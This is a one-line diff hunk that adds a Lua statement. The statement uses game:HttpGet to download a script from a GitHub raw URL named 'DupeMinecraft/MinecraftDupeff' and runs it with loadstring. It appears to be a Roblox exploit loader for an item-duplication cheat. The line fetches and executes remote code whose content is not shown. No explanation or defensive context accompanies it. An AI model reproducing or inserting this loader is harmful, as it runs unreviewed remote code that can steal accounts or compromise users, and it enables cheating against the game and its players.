@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxCreator8/DupeMinecraft/refs/heads/main/MinecraftDupeff",true))()
